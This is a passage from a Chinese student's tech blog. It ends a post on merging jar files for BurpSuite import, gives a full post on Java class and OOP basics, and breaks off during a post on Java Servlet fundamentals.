2..将包分别解压
  jar -xvf 1.jar
  jar -xvf 2.jar
  jar -xvf 引入的jar包
3.将所有jar包移出当前目录
4.将当前目录文件打包为一个jar文件
  jar -cvfM result.jar .   (别忘了.)
5.导入BurpSuite即可  
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/08/Java语法基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/08/Java语法基础/" itemprop="url">基础知识 | JAVA语法基础<一></a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-08T08:15:41+08:00">
                2019-01-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>终于忙完考试了,计划接下来的2周时间除了完成课设外,打算补下Java,读2本推理小说,接着更新博客。</p>
</blockquote>
<hr>
<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>Java是一种面向对象程序设计语言,所有的数据类型都是用类描述的,Java程序也是由若干个类组成的,想学好Java,类是必须要掌握的。</p>
<h3 id="类知识"><a href="#类知识" class="headerlink" title="类知识"></a>类知识</h3><h4 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h4><p>Java中的类分为类声明与类主体    </p>
<h5 id="类声明"><a href="#类声明" class="headerlink" title="类声明"></a>类声明</h5><pre><code>格式:`修饰符 class 类名 extends 父类名 implements 接口名`        
修饰符:可选,分为定义类的性质(abstract,final)和访问权限(public和默认等)    
extends:可选,继承父类,如无指定,默认继承Java.lang.Object,只支持单继承
implements:可选,用于指明该类实现的接口,允许一个类实现多个接口(,分割)。    
</code></pre><h5 id="类主体"><a href="#类主体" class="headerlink" title="类主体"></a>类主体</h5><p>包括成员变量与成员方法的定义与实现    </p>
<h5 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h5><p>格式:<code>变量修饰符 变量类型 变量名</code><br>变量类型为Java语言中任意的数据类型或引用数据类型(类,数组等),成员变量通过其变量修饰符来确定访问权限。</p>
<h5 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h5><p>格式:<code>方法修饰符 返回类型 方法名(参数列表)</code><br>方法修饰符:public,private,protected,final,static,abstract,synchronized。前三种说明访问权限,public(所有类都可以访问),private(只能被本类访问),protected(允许被相同包的类访问),final(修饰最终方法,被修饰过的方法不允许被子类重载),static(修饰类方法,可直接通过类名调用且不允许重载),abstract(修饰抽象方法,只有方法声明,无方法体),synchronized(修饰用于线程同步)。<br>返回类型:可以是基本数据类型或者自定义类,如不需要返回值,设置其为void即可。<br>方法名与参数列表:符合命名规范即可<br>方法体:定义功能,方法体内可定义局部变量,作用域仅在方法体内。</p>
<h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><p>当用new一个新对象时,构造方法立即执行,构造方法名必须与类名相同。    </p>
<pre><code>public 类名(参数列表){}
</code></pre><p>定义构造方法注意:<br>    1.无返回类型(包括void),修饰符只能为public,private,protected中的任一个<br>    2.不能从父类继承<br>    3.系统默认提供无参构造方法<br>    4.构造方法不能通过方法名直接调用,只能通过new运算符调用。<br>    5.构造方法可以调用当前类(this)或父类的构造方法(super),<code>必须在第一行调用</code>。</p>
<h4 id="类使用"><a href="#类使用" class="headerlink" title="类使用"></a>类使用</h4><h5 id="类声明-创建"><a href="#类声明-创建" class="headerlink" title="类声明,创建"></a>类声明,创建</h5><p>类是对象模板,只有实例化后才可使用。<br><code>Circle c1</code> //声明<br><code>Circle c1 = new Circle()</code> //new用于创建一个对象的实例并返回对象的引用。<br><code>c1.a(1,2)</code> //调用成员方法a(),参数为1,2    </p>
<h5 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h5><p>对象不再使用后,Java系统通过垃圾回收器GC,周期性地释放内存,回收工作由Java系统自动完成,减少程序员的工作量。    </p>
<h4 id="this的使用"><a href="#this的使用" class="headerlink" title="this的使用"></a>this的使用</h4><p>关键字this表示实例对象指向自己的引用,可出现再实例方法与构造方法中,不能出现在由static修饰的类方法(静态方法)。    </p>
<h5 id="实例方法和构造方法中使用this"><a href="#实例方法和构造方法中使用this" class="headerlink" title="实例方法和构造方法中使用this"></a>实例方法和构造方法中使用this</h5><p>this(color),this.h=h,this.cry() //调用本实例类的构造方法,成员变量与成员方法。</p>
<h5 id="区分成员变量与局部变量"><a href="#区分成员变量与局部变量" class="headerlink" title="区分成员变量与局部变量"></a>区分成员变量与局部变量</h5><p>成员变量在整个类中都有效,局部变量仅在方法体内有效。<code>在方法体内声明的变量与方法传入的参数称为局部变量。</code>如果在实例方法中的局部变量名字与成员变量名字相同,这个成员变量在这个方法内就会暂时失效(强龙压不过地头蛇),如果确实想引用成员变量,使用this关键字即可。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.11.30.00-image.png" alt="2019-01-08.11.30.00-image.png"></p>
<h5 id="返回实例对象本身的引用"><a href="#返回实例对象本身的引用" class="headerlink" title="返回实例对象本身的引用"></a>返回实例对象本身的引用</h5><p>this还可以作为成员方法的return语句的参数,用来返回对象本身的引用。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.11.35.39-image.png" alt="2019-01-08.11.35.39-image.png"><br>返回长大后的Dog类。    </p>
<h5 id="使用this调用类的其他构造方法"><a href="#使用this调用类的其他构造方法" class="headerlink" title="使用this调用类的其他构造方法"></a>使用this调用类的其他构造方法</h5><p>使用this调用其他类的构造方法(this(a)),至于系统具体会调用哪个方法,根据参数的类型与个数决定。    </p>
<h3 id="OOP"><a href="#OOP" class="headerlink" title="OOP"></a>OOP</h3><p>OOP是Java的重点,OOP的三个特性</p>
<pre><code>封装:用一个类将实现与使用分开,只保留接口与外部进行联系
继承:字类自动继承其父类的属性与方法,并且可以添加新的属性与方法
多态:虽然多个子类都有一个共同的方法,但是子类实例化后都可以获得完全不同的结果
</code></pre><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><pre><code>面向对象程序设计的一个特性就是封装,将实体特征的属性隐藏起来,对象与外界仅通过公共方法进行交流,提高程序的可靠性,安全性与可维护性。数据的隐藏与开放对外的接口可通过访问权限控制符实现,Java提供了public,protected,private和默认4种访问控制符
public
    可被同一个或不同包的任何类访问通常只将公共类或公共接口的成员方法组指定为public
protected
    可用来修饰类的成员变量与方法,可被本类、本包的其他类访问,也可被其他包的字类继承
默认
    用户没有指定,就会自动使用默认权限,只能被本类或其他一个包中的其他类、接口、成员方法引用,也被称为包权限
pricate
    声明类的私有成员,被private修饰的成员变量和方法只能被该类自身所访问或修改,而不能被其他类(包括该类的子类)来获取或引用    
getInfo和setInfo    
    为了系统设计的安全性考虑,一般将类的成员变量定义为private形式,而将类的成员方法定义为public对外公开。类中提供变量对应的get方法(得到private成员变量)和set方法(修改private成员变量),达到其他类可以操作该类的private成员变量
</code></pre><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><pre><code>研究生是一类特殊的学生,研究生类在保留学生类的基本属性和行为的基础上,可以增加新的属性与行为,也可以修改学生的属性和行为。这里学生就是研究生的父类(或超类),研究生为学生的子类。父类派生子类,子类继承父类,子类也可以派生其他类,这样就构成了类的层次结构。继承机制可提高系统的可扩展性与可维护性。
</code></pre><h5 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h5><pre><code>class Graduate extends Student{    
使用extends关键字实现类的继承,如果类定义没有使用extends关键字,则默认该类的父类为java.lang.Object,Object类是Java预定义的所有类的父类，包含所有的Java使用的公共属性其中定义的属性与方法均可被任何类使用 继承或修改。Java只能继承一个父类(单继承),子类继承父类的变量和方法,可以增加父类没有的变量或方法,也可以修改已有的变量或方法。
用Eclipse打开Java文件,连按两次Ctrl+o,可得到当前类与父类的属性,方法:    
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2019-01-07.19.45.34-image.png" alt="2019-01-07.19.45.34-image.png"><br>    <code>子类可以继承父类的成员属性与方法,但受访问权限的限制。如父类与子类在不同的包中定义,子类只能public与protected权限的变量,如果父类与子类在一个包中定义,子类能访问父类的public,protected与默认权限的变量,如果要访问private类型的变量,只能使用其父类的set与get方法访问。</code></p>
<h5 id="super的使用"><a href="#super的使用" class="headerlink" title="super的使用"></a>super的使用</h5><p>子类在继承父类的属性与方法时,可能会出现变量隐藏(变量的名相同,类型不要求)或方法覆盖(子类与父类的方法名,返回类型,入口参数的数目,类型,顺序相同,只是实现的功能不同)。此时父类的变量与方法就会被覆盖,如需要调用父类被隐藏的属性与方法,可通过<code>super</code>关键字调用<br>eg:</p>
<pre><code>public class Student{
  public static void main(String[] args) {
      AClass aClass = new AClass();
      BClass bClass = new BClass();

      aClass.p1();
      bClass.p1();
      }
}
public class AClass {
    int a;
    float a1;

    public AClass() {
        a = 50;
        a1 = 99.99f;
    }
    public void p1() {
        System.out.println(&quot;method A&quot;);
        System.out.println(&quot;a=&quot;+a);
        }
}
public class BClass extends AClass{
    int a;    //与父类的成员变量名相同,属于变量隐藏
    public BClass() {
      a = 10;
      a1 = 123.6f;
  }
    public void p1() {    //与父类的成员方法相同,属于方法覆盖现象
      System.out.println(&quot;method b&quot;);
      System.out.println(&quot;a=&quot;+a);    //这里的a是bClass的变量a
      super.p1();     //通过super调用被覆盖的父类成员方法
      System.out.println(&quot;super.a=&quot;+super.a);    //通过super访问被隐藏的父类成员变量
  }
}
</code></pre><p>   运行结果:</p>
<pre><code>   method A
a=50
method b
a=10
method A
a=50
super.a=50
</code></pre><p><code>super</code>除上述的2种作用,还可显示调用父类构造方法。<br>    实例方法与构造方法的super关键字都指向父类,实例方法中的super关键字是去调用父类中的某个方法,而构造方法中使用是去调用父类的构造方法。</p>
<h5 id="子类对象的构造"><a href="#子类对象的构造" class="headerlink" title="子类对象的构造"></a>子类对象的构造</h5><p>当子类创建时,系统默认自动(显式或隐式)调用父类的无参构造方法。需要注意的是,如果父类定义了有参数的构造方法,系统就不会再提供默认的无参构造方法,此时子类一定要避免使用父类的无参构造方法。<br>调用构造方法时,遵循的规则:<br>    1.创建对象时,调用该类的父类构造方法(将第一条写为super语句即可),super可以调用父类的任何一个带参数或不带参数的构造方法。<br>    2.如果类的构造方法中第一条语句没有使用super,则编译器也会默认用super()调用父类的无参构造方法。<br>    3.用this()调用本类的构造方法。<br>    4.如父类定义了有参构造方法,子类的构造方法一定要super显式调用父类的有参构造方法。<br>所以说,在定义一个类时,如果没有特殊需求,尽量在类中定义一个无参的构造方法,防止被继承时出现错误。</p>
<h5 id="对象类型转换"><a href="#对象类型转换" class="headerlink" title="对象类型转换"></a>对象类型转换</h5><pre><code>如同数据类型的转换,对象也可以在一定范围内进行转换,由于子类具有父类的方法与属性,因此子类对象可以向上转化为父类对象(上转型对象)
 SuperClass spc = new SubClass(); //SubClass是SuperClass的子类,父类引用指向对象实例
SubClass sbc = new SuperClass(); //错误 因为父类不一定含有子类的属性与方法
</code></pre><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><pre><code>方法重载与方法覆盖是是实现继承的基本手段。重载只是方法的名字相同,而参数(参数类型,参数个数),方法覆盖是指子类的方法名与父类的方法名完全相同(参数类型,个数,返回值类型),即在子类重写了父类的方法,这样就能使用相同的方法名实现不同的功能。

class Animal{
    public void enjoy(){

    }
}
class Cat extends Animal{
    public void enjoy(){
        System.out.println(&quot;Cat....&quot;);
    }
}
class Dog extends Animal{
    public void enjoy(){
        System.out.println(&quot;Dog....&quot;);
    }
}
public class Testpolymoph{

  public static void main(String[] args){
      Testpolymoph test = new Testpolymoph();
      Cat cat = new Cat();
      Dog dog = new Dog();
      test.myEnjoy(cat);
      test.myEnjoy(dog);
  }

  public void myEnjoy(Animal pet){
      pet.enjoy();
  }

}
</code></pre><p>运行结果:</p>
<pre><code>用一个enjoy()方法就实现了不同的对象所需的操作,即不修改程序代码就可以改变程序运行时所绑定的具体代码,让程序可以选择多个运行状态,这就是实现了多态型。(像是定义一个方法,传入的参数是不同的对象,然后执行不同对象相应的相同名的成员方法)
</code></pre><h3 id="非访问控制符"><a href="#非访问控制符" class="headerlink" title="非访问控制符"></a>非访问控制符</h3><pre><code>类定义的时候除了可以使用public,private,protected和默认来设置成员变量与成员方法的访问权限,还可以使用static,final,abstract来说明其特性。 
</code></pre><h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><h5 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h5><pre><code>被static修饰的成员变量或成员方法称为类变量(静态变量)和类方法(静态方法)。没有被static修饰的称为实例变量和实例方法。
实例变量依附于对象,不同实例变量占用不同的内存空间。类变量依附于类,占用公共空间,该类的每个实例对象共享同一变量的存储空间,每个对象对类变量的修改都会影响其他实例对象。
public class Student{
    public static void main(String[] args) {
      System.out.println(&quot;现在的人数:&quot;+AClass.personnum);
      AClass aClass1 = new AClass();
      AClass aClass2 = new AClass();
      System.out.println(&quot;现在的人数:&quot;+AClass.personnum);
      System.out.println(&quot;现在的人数:&quot;+aClass2.personnum);
    }
}
public class AClass {
  static int personnum = 100;

  public AClass() {
      personnum ++;
  }
}
</code></pre><p>输出结果:<br>    现在的人数:100<br>    现在的人数:102<br>    现在的人数:102<br>每次创建AClass的实例时,调用其构造方法使其personnum加1,因此personnum可以记录所产生的实例对象的个数。可通过类名(AClass.personnum)实例对象名(aClass2.personnum)访问变量。且每个对象对静态变量personnum的修改都会影响其他实例对象。</p>
<h5 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h5><pre><code>类方法的本质是该方法属于整个类,而不是某个实例,可以不创建实例,直接通过类名调用(AClass.add(1,1))。

类方法的特点：
    1.可直接调用,不需要创建实例对象,例如,Java Application的入口main()方法被声明为static类方法,不需要创建任何实例对象即可调用。
    2.类方法属于整个类,被调用时可能还没有创建任何实例对象实例,因此,类方法只能访问类变量,而不能直接访问实例变量或实例方法。
    3.类方法中不能使用this关键字,因为静态方法不属于任何一个实例。
</code></pre><p>eg:</p>
<pre><code>public class Student{
    public static void main(String[] args) {
        System.out.println(&quot;sum&quot;+AClass.sum(3, 1));
        //System.out.println(&quot;sub&quot;+AClass.sub(3,1));  会报错,不能直接调用实例方法
    }
}
public class AClass {
  //static int personnum = 100;
  int z = 3;

  public static int sum(int a,int b) {
      //return z; 会报错,因为类方法中只能使用类变量,不能使用实例变量。
      return a+b;
  }

  public int sub(int a,int b) {
      return a-b;
  }

}
</code></pre><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><pre><code>final可以修饰类,成员变量,成员方法,被final修饰过类,变量,方法的均不允许继承或覆盖。
</code></pre><h5 id="final修饰类"><a href="#final修饰类" class="headerlink" title="final修饰类"></a>final修饰类</h5><pre><code>被final修饰过的类称为最终类,它不可能有子类。
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-08.09.58.52-image.png" alt="2019-01-08.09.58.52-image.png"></p>
<h5 id="final修饰方法"><a href="#final修饰方法" class="headerlink" title="final修饰方法"></a>final修饰方法</h5><blockquote>
<p>使用final方法的原因有两个。第一个原因是把方法锁定，以防任何继承类修改它的含义；第二个原因是效率。在早期的Java实现版本中，会将final方法转为内嵌调用。但是如果方法过于庞大，可能看不到内嵌调用带来的任何性能提升。在最近的Java版本中，不需要使用final方法进行这些优化了    </p>
</blockquote>
<p>因此,只有在想明确禁止该方法在子类中被覆盖的情况下才将方法设置为final。    </p>
<h5 id="final修饰变量"><a href="#final修饰变量" class="headerlink" title="final修饰变量"></a>final修饰变量</h5><h6 id="final修饰普通变量"><a href="#final修饰普通变量" class="headerlink" title="final修饰普通变量"></a>final修饰普通变量</h6><pre><code>被final修饰的变量称为常量,不允许修改
final int a = 3;a = 2;  //编译器会报错
</code></pre><h5 id="final修饰引用变量"><a href="#final修饰引用变量" class="headerlink" title="final修饰引用变量"></a>final修饰引用变量</h5><pre><code>当使用final修饰引用类型变量时，它仅仅保证他的地址不变，即一直引用同一个对象，但这个对象完全可以发生改变
</code></pre><h4 id="其他修饰符"><a href="#其他修饰符" class="headerlink" title="其他修饰符"></a>其他修饰符</h4><h5 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h5><pre><code>主要用于多线程程序的协调和同步,如果某个方法被该关键字修饰,意味着不管哪个县城运行到这个方法时,都要检查有没有线程正在用这个方法,若有,则要等到正在使用的线程结束后,再运行此线程,如无,则直接运行。
</code></pre><h3 id="抽象类与接口"><a href="#抽象类与接口" class="headerlink" title="抽象类与接口"></a>抽象类与接口</h3><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p>先了解以下抽象方法，抽象方法是一种特殊的方法:他只有声明,而没有具体的实现,由它的子类去实现。同时抽象类提供了继承的概念,它的出发点是为了继承,否则它也没有存在的意义<br>抽象方法的声明格式:<code>abstract void fun();</code>如果一个类含有抽象方法,则称这个类为抽象类。<br>定义:如果一个类中没有包含足够的信息来描述具体的对象,<br>格式:<code>abstract class 类名 extends 父类 implements 接口名</code><br>eg:</p>
<pre><code>public abstract class Animal {
    public abstract void cry();
}

public class Cat extends Animal{

    @Override
    public void cry() {
        System.out.println(&quot;喵喵&quot;);
    }
}

public class Dog extends Animal{

    @Override
    public void cry() {
        System.out.println(&quot;汪汪&quot;);
    }

}

public class Test {

    public static void main(String[] args) {
        Animal a1 = new Cat();
        Animal a2 = new Dog();

        a1.cry();
        a2.cry();
    }
</code></pre><p>结果:<br>    喵喵喵<br>    汪汪汪<br>代码定义了一个抽象类Animal,必须提供抽象方法cry(),猫,狗都是动物的子类,由于cry为抽象方法,所以Cat,Dog必须实现cry</p>
<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><p>接口在Java中是一个抽象集合,是抽象方法的集合。用来建立类与类之间的协议,它所提供的仅仅是一种协议,没有具体的实现,实现该接口的实现类必须实现该接口的所有方法,通过使用implements,表示遵循某个特定的接口。<br>接口是抽象类的延伸,一个类可以实现多个接口,弥补了类不能多继承的缺陷,一般抽象类与接口配合使用,既可以保证数据安全性又可以实现多继承。<br>注意:接口的所有方法的访问权限被系统自动定义为public,实现接口的非抽象类必须实现该接口的所有方法    </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/09/java_Servlet基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/java_Servlet基础/" itemprop="url">基础知识 | Java_Servlet 基础</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T08:15:41+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>最近在学习Java,完成学校给布置的Java_web实验,写一个简单论坛,实验内容还需要完善,简单记录下所学内容。</p>
</blockquote>
<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><blockquote>
<p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。使用 Servlet,可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p>
</blockquote>
<h3 id="Servlet的生命周期"><a href="#Servlet的生命周期" class="headerlink" title="Servlet的生命周期"></a>Servlet的生命周期</h3><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-12-03.17.54.18-image.png" alt="2018-12-03.17.54.18-image.png"></p>
<p>1.初始化阶段            </p>
<blockquote>
<p>当客户端向Servlet容器发出请求要求访问Servlet时,Servlet容器首先会解析请求,检查内存是否已经存在该Servlet对象,如果有则直接使用该Servlet对象,如果没有就创建Servlet对象,然后通过调用init()方法实现Servlet的初始化工作,需要注意的是,在Servlet的整个生命周期内,它的init()方法只被调用一次。</p>
</blockquote>
<p>2.运行阶段</p>
<blockquote>
<p>这是生命周期最核心的阶段,Servlet容器为这个请求创建代表Http请求的ServletRequest对象和代表Http响应的ServletResponse对象,然后将他们作为参数传递给Servlet的service()方法。service()方法从ServletRequest对象中获取客户端传输过来的信息并处理该请求,通过ServletResponse对象生成响应结果。在Servlet的生命周期内,每收到一次访问请求,Servlet容器都会调用一次Servlet的service()方法,并且创建新的ServletRequest和ServletResponse对象,service()方法在Servlet的生命周期内会被调用多次。</p>
</blockquote>
<p>3.销毁阶段:</p>
<blockquote>
<p>当服务器关闭或Web应用被移除容器后,Servlet会随着Web应用的销毁而销毁,在销毁Servlet之前,Servlet容器会调用Servlet的destroy()方法,以便让Servlet对象释放他所占用的资源。在Servlet的整个生命周期中,destory()方法也只被调用一次。需要注意的是,Servlet对象一旦创建就会驻留在内存中等待客户端的访问,直到服务器关闭,或Web应用被移除容器时,Servlet对象才会销毁。</p>
</blockquote>
<hr>
<p>配置Servlet:</p>
<pre><code>1.注解配置:@WebServlet(&quot;/RequestMethodServlet&quot;)  //自动创建注解,不用手动配置  现在的主流      
2.web.xml 配置
</code></pre><h3 id="运行Servlet"><a href="#运行Servlet" class="headerlink" title="运行Servlet:"></a>运行Servlet:</h3><p>由于<code>HttpServlet</code>类在重写的<code>service()</code>方法中,为每一种HTTP请求方式都定义了<code>doXXX()</code>方法,因此,当定义的类继承<code>HttpServlet</code>时,只需要根据请求方式,重写对应的<code>doxxx()</code>方法即可,而不需要重写<code>service()</code>方法:<br>重写doget与dopost方法:</p>
<pre><code>protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    // TODO Auto-generated method stub
    PrintWriter out = response.getWriter();
    out.write(&quot;this is get method&quot;);

}

protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    // TODO Auto-generated method stub
    PrintWriter out = response.getWriter();
    out.write(&quot;this is post method&quot;);
}
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-12-03.17.31.50-image.png" alt="2018-12-03.17.31.50-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-12-03.17.31.05-image.png" alt="2018-12-03.17.31.05-image.png"></p>
<p>如果GET与POST请求的处理方式一致,则可以在<code>doPost()</code>方法中直接调用<code>doGet()</code>方法：<code>this.doGet(request, response);</code>即可。    </p>
<h3 id="ServletContext与ServletConfig接口"><a href="#ServletContext与ServletConfig接口" class="headerlink" title="ServletContext与ServletConfig接口"></a>ServletContext与ServletConfig接口</h3><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><h5 id="1-获取WEB应用程序的初始化参数"><a href="#1-获取WEB应用程序的初始化参数" class="headerlink" title="1.获取WEB应用程序的初始化参数"></a>1.获取WEB应用程序的初始化参数</h5><p>在web.xml文件中,不仅可以配置Servlet的初始化信息,还可以配置WEB应用程序的初始化参数,web应用程序的初始化参数:</p>
<pre><code>#web.xml
&lt;context-param&gt;
      &lt;param-name&gt;companyname&lt;/param-name&gt;
      &lt;param-value&gt;itcast&lt;/param-value&gt;    
  &lt;/context-param&gt;
  &lt;context-param&gt;
      &lt;param-name&gt;address&lt;/param-name&gt;
      &lt;param-value&gt;beijing&lt;/param-value&gt;
  &lt;/context-param&gt;
</code></pre><p>Servlet中读取该配置信息:</p>
<pre><code>PrintWriter out = response.getWriter();
ServletContext context = (ServletContext) this.getServletContext();  //得到ServletContext对象
Enumeration&lt;String&gt; paramNames = context.getInitParameterNames();     //得到可遍历的数组集合Enumeration对象
out.println(&quot;there are param-name and param-value:&quot;);
while(paramNames.hasMoreElements()) {                      //hasMoreElement方法,是否包含元素,有返回true
    String name = paramNames.nextElement();
    String value = context.getInitParameter(name);
    out.println(name+&quot;:&quot;+value);

}
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-07.08.58.33-image.png" alt="2018-12-07.08.58.33-image.png"></p>
<h6 id="2-实现多个Servlet的对象共享数据"><a href="#2-实现多个Servlet的对象共享数据" class="headerlink" title="2.实现多个Servlet的对象共享数据"></a>2.实现多个Servlet的对象共享数据</h6><p>由于一个WEB应用中的所有Servlet共享同一个ServletContext对象,因此,ServletContext对象的域属性可以被该WEB应用中的所有Servlet访问</p>
<pre><code>#TestServlet04
javax.servlet.ServletContext context = this.getServletContext();
context.setAttribute(&quot;data&quot;, &quot;this servlet save data&quot;);


#TestServlet05
PrintWriter out = response.getWriter();
javax.servlet.ServletContext context = this.getServletContext();
String data = (String) context.getAttribute(&quot;data&quot;);
out.println(data);
</code></pre><p>然后启动服务器,先访问TestServlet04将数据存入ServletContext对象,然后访问TestServlet05,即可得到ServletContext对象的data属性值<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-07.09.15.29-image.png" alt="2018-12-07.09.15.29-image.png"><br>说明ServletContext对象中的数据可以被多个Servlet访问。</p>
<h5 id="3-读取WEB应用下的资源文件"><a href="#3-读取WEB应用下的资源文件" class="headerlink" title="3.读取WEB应用下的资源文件"></a>3.读取WEB应用下的资源文件</h5><p>在WebContent下面新建itcast.properties文件,写入:</p>
<pre><code>Company = itcast
Address = Beijing
</code></pre><p>我们在Servlet中读取(相对路径):</p>
<pre><code>#TestServlet06:
ServletContext context = this.getServletContext();
PrintWriter out = response.getWriter();

//获取相对路径中的输入流对象
InputStream in = context.getResourceAsStream(&quot;/itcast.properties&quot;);
Properties pros = new Properties();
pros.load(in);
out.println(&quot;Company:&quot;+pros.getProperty(&quot;Company&quot;));
out.println(&quot;address:&quot;+pros.getProperty(&quot;Address&quot;));
</code></pre><p>根据绝对路径获取WEB应用的参数:</p>
<pre><code>response.setContentType(&quot;text/html;charset=utf-8&quot;);
ServletContext context = this.getServletContext();
PrintWriter out = response.getWriter();

String path = context.getRealPath(&quot;/itcast.properties&quot;); //得到绝对路径
out.println(&quot;path:&quot;+path);
FileInputStream in = new FileInputStream(path);

Properties pros = new Properties();
pros.load(in);
out.println(&quot;Company:&quot;+pros.getProperty(&quot;Company&quot;));
out.println(&quot;address:&quot;+pros.getProperty(&quot;Address&quot;));
</code></pre><p>访问TestServlet06,可看到已经成功取出数据<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-07.10.21.31-image.png" alt="2018-12-07.10.21.31-image.png"></p>
<p>ServletConfig   </p>
<p>#####<br>当Tomcat初始化一个Servlet参数时,会将Servlet的配置信息封装到一个ServletConfig对象中,通过调用init(ServletConfig config)方法将ServletConfig对象传递给Servlet。    </p>
<h3 id="HttpServletRequest与HttpServletResponse对象"><a href="#HttpServletRequest与HttpServletResponse对象" class="headerlink" title="HttpServletRequest与HttpServletResponse对象"></a>HttpServletRequest与HttpServletResponse对象</h3><blockquote>
<p>Servlet 最主要的功能就是处理客户端请求,并向客户端做出响应。为此,针对Servlet的每次请求,Web服务器在调用service()之前,都会创建2个对象.分别是HttpServlet与HttpServletResponse。</p>
</blockquote>
<h4 id="HttpServletRequest对象"><a href="#HttpServletRequest对象" class="headerlink" title="HttpServletRequest对象"></a>HttpServletRequest对象</h4><h5 id="获取请求参数"><a href="#获取请求参数" class="headerlink" title="获取请求参数:"></a>获取请求参数:</h5><pre><code>获取前台form表单传输过来的参数信息:
String username = request.getparameter(&quot;username&quot;);
String pwd = request.getparameter(&quot;password&quot;);

String[] hobbys = request.getparameter(&quot;hobby&quot;);
for(int i=0;i&lt;hobbys.length();i++){
    out.print(hobbys[i]);    
}

Enumeration names = request.getParameterNames()   //返回所有参数名    
Map&lt;String,String[]&gt; map=request.getParameterMap();   //将请求参数与值放进一个Map对象中返回

Map&lt;String,String[]&gt; map=request.getParameterMap();  
     //遍历  
      for(Iterator iter=map.entrySet().iterator();iter.hasNext();){  
            Map.Entry element=(Map.Entry)iter.next();  
            //key值  
            Object strKey = element.getKey();  
            //value,数组形式  
          String[] value=(String[])element.getValue();  

          out.print(strKey.toString() +&quot;=&quot;);  
         for(int i=0;i&lt;value.length;i++){  
             out.print(value[i]+&quot;,&quot;);  
         }
